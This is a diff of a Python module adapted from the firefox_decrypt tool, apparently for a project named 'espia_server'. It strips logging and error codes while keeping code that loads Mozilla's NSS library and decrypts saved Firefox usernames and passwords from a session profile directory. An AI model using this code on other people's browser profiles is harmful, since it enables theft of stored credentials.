@@ -1,7 +1,6 @@
 import argparse
 import ctypes as ct
 import locale
-import logging
 import os
 import pathlib
 import platform
@@ -11,59 +10,16 @@ from base64 import b64decode
 from configparser import ConfigParser
 from typing import Optional, Iterator, Any
 
+from espia_server.app.utils.tool_utils import log_error
+
 _FIREFOX_PRODUCT = {
     "Passwords": [],
     "Cookies": []
 }
-LOG: logging.Logger
 VERBOSE = False
 SYSTEM = platform.system()
 SYS64 = sys.maxsize > 2 ** 32
 DEFAULT_ENCODING = "utf-8"
-
-
-class NotFoundError(Exception):
-    """Exception to handle situations where a credentials file is not found
-    """
-    pass
-
-
-class Exit(Exception):
-    """Exception to allow a clean exit from any point in execution
-    """
-    CLEAN = 0
-    ERROR = 1
-    MISSING_PROFILEINI = 2
-    MISSING_SECRETS = 3
-    BAD_PROFILEINI = 4
-    LOCATION_NO_DIRECTORY = 5
-    BAD_SECRETS = 6
-    BAD_LOCALE = 7
-
-    FAIL_LOCATE_NSS = 10
-    FAIL_LOAD_NSS = 11
-    FAIL_INIT_NSS = 12
-    FAIL_NSS_KEYSLOT = 13
-    FAIL_SHUTDOWN_NSS = 14
-    BAD_MASTER_PASSWORD = 15
-    NEED_MASTER_PASSWORD = 16
-
-    PASSSTORE_NOT_INIT = 20
-    PASSSTORE_MISSING = 21
-    PASSSTORE_ERROR = 22
-
-    READ_GOT_EOF = 30
-    MISSING_CHOICE = 31
-    NO_SUCH_PROFILE = 32
-
-    UNKNOWN_ERROR = 100
-    KEYBOARD_INTERRUPT = 102
-
-    def __init__(self, exitcode):
-        self.exitcode = exitcode
-
-    def __unicode__(self):
-        return f"Premature program exit with exit code {self.exitcode}"
 
 
 class Credentials:
@@ -72,20 +28,10 @@ class Credentials:
 
     def __init__(self, db):
         self.db = db
-
-        LOG.debug("Database location: %s", self.db)
         if not os.path.isfile(db):
-            raise NotFoundError(f"ERROR - {db} database not found\n")
-
-        LOG.info("Using %s for credentials.", db)
+            raise Exception(f"ERROR - {db} database not found\n")
 
     def __iter__(self) -> Iterator[tuple[str, str, str, int]]:
-        pass
-
-    def done(self):
-        """Override this method if the credentials subclass needs to do any
-        action after interaction
-        """
         pass
 
 
@@ -126,28 +72,27 @@ def find_nss(locations, nssname) -> ct.CDLL:
                 os.chdir(workdir)
 
     else:
-        LOG.error("Couldn't find or load '%s'. This library is essential "
-                  "to interact with your Mozilla profile.", nssname)
-        LOG.error("If you are seeing this error please perform a system-wide "
-                  "search for '%s' and file a bug report indicating any "
-                  "location found. Thanks!", nssname)
-        LOG.error("Alternatively you can try launching firefox_decrypt "
-                  "from the location where you found '%s'. "
+        log_error(f"Couldn't find or load {nssname}. This library is essential "
+                  "to interact with your Mozilla profile.")
+        log_error("If you are seeing this error please perform a system-wide "
+                  f"search for {nssname} and file a bug report indicating any "
+                  "location found. Thanks!")
+        log_error("Alternatively you can try launching firefox_decrypt "
+                  f"from the location where you found {nssname} "
                   "That is 'cd' or 'chdir' to that location and run "
-                  "firefox_decrypt from there.", nssname)
+                  "firefox_decrypt from there.")
 
-        LOG.error("Please also include the following on any bug report. "
+        log_error("Please also include the following on any bug report. "
                   "Errors seen while searching/loading NSS:")
 
         for target, error in fail_errors:
-            LOG.error("Error when loading %s was %s", target, error)
+            log_error(f"Error when loading {target} was {error}")
 
-        raise Exit(Exit.FAIL_LOCATE_NSS)
+        raise Exception
 
 
 def load_libnss():
-    """Load libnss into python using the CDLL interface
-    """
+    """Load libnss into python using the CDLL interface"""
     if SYSTEM == "Windows":
         nssname = "nss3.dll"
         if SYS64:
@@ -186,27 +131,11 @@ def load_libnss():
             ]
 
         # If either of the supported software is in PATH try to use it
-        software = ["firefox", "thunderbird", "waterfox", "seamonkey"]
-        for binary in software:
-            location: Optional[str] = shutil.which(binary)
-            if location is not None:
-                nsslocation: str = os.path.join(os.path.dirname(location), nssname)
-                locations.append(nsslocation)
-
-    elif SYSTEM == "Darwin":
-        nssname = "libnss3.dylib"
-        locations = (
-            "",
-            "/usr/local/lib/nss",
-            "/usr/local/lib",
-            "/opt/local/lib/nss",
-            "/sw/lib/firefox",
-            "/sw/lib/mozilla",
-            "/usr/local/opt/nss/lib",
-            "/opt/pkg/lib/nss",
-            "/Applications/Firefox.app/Contents/MacOS"
-        )
-
+        software = "firefox"
+        location: Optional[str] = shutil.which(software)
+        if location is not None:
+            nsslocation: str = os.path.join(os.path.dirname(location), nssname)
+            locations.append(nsslocation)
     else:
         nssname = "libnss3.so"
         if SYS64:
@@ -306,36 +235,26 @@ class NSSProxy:
 
     def initialize(self, profile: pathlib.Path):
         profile_path = f"sql:{profile}"
-        LOG.debug("Initializing NSS with profile '%s'", profile_path)
         err_status: int = self._NSS_Init(profile_path)
-        LOG.debug("Initializing NSS returned %s", err_status)
-
         if err_status:
-            self.handle_error(
-                Exit.FAIL_INIT_NSS,
-                "Couldn't initialize NSS, maybe '%s' is not a valid profile?",
-                profile,
-            )
+            self.handle_error("Couldn't initialize NSS, maybe '%s' is not a valid profile?", profile)
 
     def shutdown(self):
         err_status: int = self._NSS_Shutdown()
 
         if err_status:
-            self.handle_error(
-                Exit.FAIL_SHUTDOWN_NSS,
-                "Couldn't shutdown current NSS profile",
-            )
+            self.handle_error("Couldn't shutdown current NSS profile")
 
     def authenticate(self, profile, interactive):
         pass
 
-    def handle_error(self, exitcode: int, *logerror: Any):
+    def handle_error(self, *logerror: Any):
         """If an error happens in libnss, handle it and print some debug information
         """
         if logerror:
-            LOG.error(*logerror)
+            log_error(*logerror)
         else:
-            LOG.debug("Error during a call to NSS library, trying to obtain error info")
+            log_error(f"Error during a call to NSS library, trying to obtain error info")
 
         code = self._PORT_GetError()
         name = self._PR_ErrorToName(code)
@@ -343,9 +262,7 @@ class NSSProxy:
         # 0 is the default language (localization related)
         text = self._PR_ErrorToString(code, 0)
 
-        LOG.debug("%s: %s", name, text)
-
-        raise Exit(exitcode)
+        raise Exception
 
     def decrypt(self, data64):
         data = b64decode(data64)
@@ -353,13 +270,9 @@ class NSSProxy:
         out = self.SECItem(0, None, 0)
 
         err_status: int = self._PK11SDR_Decrypt(inp, out, None)
-        LOG.debug("Decryption of data returned %s", err_status)
         try:
             if err_status:  # -1 means password failed, other status are unknown
-                self.handle_error(
-                    Exit.NEED_MASTER_PASSWORD,
-                    "Password decryption failed. Passwords protected by a Master Password!",
-                )
+                self.handle_error("Password decryption failed. Passwords protected by a Master Password!")
 
             res = out.decode_data()
         finally:
@@ -396,8 +309,9 @@ class MozillaInteraction:
         self.proxy.shutdown()
 
     def decrypt_passwords(self, credentials: []) -> dict:
-        """Decrypt requested profile using the provided password.
-        Returns all passwords in a list of dicts
+        """
+            Decrypt requested profile using the provided password.
+            Returns all passwords in a list of dicts
         """
         decrypted_obj = {"Credentials": []}
         decrypted = decrypted_obj.get("Credentials")
@@ -412,7 +326,7 @@ class MozillaInteraction:
                     username = self.proxy.decrypt(username)
                     password = self.proxy.decrypt(password)
                 except (TypeError, ValueError) as e:
-                    print(e)
+                    log_error(e)
                     continue
             decrypted.append({"url": domain, "username": username, "password": password})
         return decrypted_obj
@@ -420,19 +334,12 @@ class MozillaInteraction:
 
 def read_profiles(basepath):
     profileini = os.path.join(basepath, "profiles.ini")
-
-    LOG.debug("Reading profiles from %s", profileini)
-
     if not os.path.isfile(profileini):
-        LOG.warning("profile.ini not found in %s", basepath)
-        raise Exit(Exit.MISSING_PROFILEINI)
+        raise Exception
 
     # Read profiles from Firefox profile folder
     profiles = ConfigParser()
     profiles.read(profileini, encoding=DEFAULT_ENCODING)
-
-    LOG.debug("Read profiles %s", profiles.sections())
-
     return profiles
 
 
@@ -445,29 +352,17 @@ class ConvertChoices(argparse.Action):
         setattr(namespace, self.dest, self.mapping[value])
 
 
-def setup_logging() -> None:
-    """Setup the logging level and configure the basic logger
-    """
-    logging.basicConfig(
-        format="%(asctime)s - %(levelname)s - %(message)s",
-        level=logging.INFO,
-    )
-
-    global LOG
-    LOG = logging.getLogger(__name__)
-
-
 def identify_system_locale() -> str:
     encoding: Optional[str] = locale.getpreferredencoding()
 
     if encoding is None:
-        LOG.error(
+        log_error(
             "Could not determine which encoding/locale to use for NSS interaction. "
             "This configuration is unsupported.\n"
             "If you are in Linux or MacOS, please search online "
             "how to configure a UTF-8 compatible locale and try again."
         )
-        raise Exit(Exit.BAD_LOCALE)
+        raise Exception
 
     return encoding
 
@@ -475,7 +370,6 @@ def identify_system_locale() -> str:
 def handle_firefox_passwords(session_dir_path: pathlib.Path, credentials: dict) -> list:
     firefox_passwords = []
     try:
-        setup_logging()
         moz = MozillaInteraction()
         moz.load_profile(session_dir_path)
         # Decode all passwords
